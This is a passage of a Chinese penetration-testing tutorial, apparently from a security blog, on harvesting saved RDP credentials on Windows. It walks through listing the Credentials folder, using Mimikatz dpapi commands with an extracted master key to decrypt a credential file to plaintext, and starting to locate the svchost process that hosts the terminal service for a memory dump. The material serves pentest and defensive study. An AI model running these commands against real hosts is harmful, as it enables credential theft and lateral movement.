&quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713142937250</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这些 Windows 凭据保存在磁盘上的以下位置中：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Users\&lt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">用户名&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\AppData\Local\Microsoft\Credentials</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">我们可以用如下命令查看当前主机上保存的连接凭据：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmdkey </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">list    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 查看当前保存的凭据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dir </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">userprofile</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\AppData\Local\Microsoft\Credentials\*    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 遍历 Credentials 目录下保存的凭据</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5357941834451901" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/12_9qgw2eBEUHPm3QwmbTUIbw2nSwplvQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPmo0bf6wZ46QDmEJZmU3wg57C9qgw2eBEUHPm3QwmbTUIbw2nSwplvQ/640?wx_fmt=png'" data-type="png" data-w="894" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713143759764</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图可以看到，Credentials 目录下保存有两个历史连接凭据，但里面的凭据是加密的，要想查看还需要使用 Mimikatz。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">使用 Mimikatz 导出</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Mimikatz 也支持导出 Windows 上 Credentials 目录下保存的远程桌面连接凭据。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先执行以下命令：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dpapi</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cred </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">in</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Users\bunny\AppData\Local\Microsoft\Credentials\4D8F543ACD10B143849414A5085FE4E6</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\&lt;用户名&gt;\AppData\Local\Microsoft\Credentials\&lt;凭据文件&gt;"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.49101796407185627" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/13_AYluLlSNYGTZ4mhdrIMhmG3wxH7q3g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPiaBDhM8nI1d21eib47TTzxFK33AYluLlSNYGTZ4mhdrIMhmG3wxH7q3g/640?wx_fmt=png'" data-type="png" data-w="1503" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713144822155</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图，得到的 pbData 就是凭据的加密数据，guidMasterKey 是凭据的 GUID。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后将上图中得到的 guidMasterKey 值（&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">{b3d8987a-42dd-4c6b-9c7f-a37d93e722b9}</code>）记录下来并执行以下命令，找到与 guidMasterKey 也就是下图执行结果中的 GUID 相关联的 MasterKey：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sekurlsa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dpapi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># mimikatz.exe "privilege::debug" "sekurlsa::dpapi"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.48" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/14_37emhXiawSTDBanzwGRF9KScrzxdQA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPeZDoOlzksLqpU06ico6RREDXHW37emhXiawSTDBanzwGRF9KScrzxdQA/640?wx_fmt=png'" data-type="png" data-w="1550" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713145432933</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">记录 MasterKey 的值为&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">53c01b9679dc0e55b91584781fe13eb1c5faa2694fc693f98838fedd74d3ad371754b9d9d841769882c8e14c965e4ae40a45dce88101cf5831fc4d694cc38e81</code>。这个 MasterKey 就是加密凭据所使用的密钥。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">最后执行以下命令，使用上面找到的 MasterKey 值破解指定的凭据文件 4D8F543ACD10B143849414A5085FE4E6：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">mimikatz</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"dpapi::cred /in:C:\Users\bunny\AppData\Local\Microsoft\Credentials\4D8F543ACD10B143849414A5085FE4E6 /masterkey:53c01b9679dc0e55b91584781fe13eb1c5faa2694fc693f98838fedd74d3ad371754b9d9d841769882c8e14c965e4ae40a45dce88101cf5831fc4d694cc38e81"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.34531993654151244" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/15_cDUzsnM2kL50v7jibtnhXUXSia6m7Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPzLQsrCdD7rBw6iccic3RE84cOxdxicDUzsnM2kL50v7jibtnhXUXSia6m7Q/640?wx_fmt=png'" data-type="png" data-w="1891" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713145946949</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如下图所示，成功破解得到了明文凭据：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23837209302325582" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/16_icNeVp2gPeSOaNjXcf5Yc9npXr642w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPGdMWEwAjbNLibM7Ds2PNcicF8fRicNeVp2gPeSOaNjXcf5Yc9npXr642w/640?wx_fmt=png'" data-type="png" data-w="1892" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713150050063</figcaption></figure><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">从 svchost 中获取 RDP 连接凭据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">svchost.exe 是一个 Windows 系统进程，svchost.exe 是从动态链接库 (DLL) 中运行的服务的通用主机进程名称。这个程序对系统的正常运行是非常重要，可以承载多个服务来防止资源消耗。许多服务通过注入到该程序中启动，所以当我们查看进程列表时会有多个该文件的进程。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当用户在目标主机上开启运行 RDP 远程桌面并通过远程桌面连接进行身份验证时，终端服务会由 svchost 进程托管。但是基于 WIndows 身份验证机制的工作原理，RDP 连接凭据是以纯文本形式存储在 svchost 进程的内存中的。所以我们可以通过转储 svchost 进程的内存来获取 RDP 连接凭据。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">由于查看进程列表往往会有多个 svchost 进程，所以我们要先识别是哪个进程托管了终端服务的连接。执行如下命令查询终端服务：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sc queryex termservice</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3519163763066202" 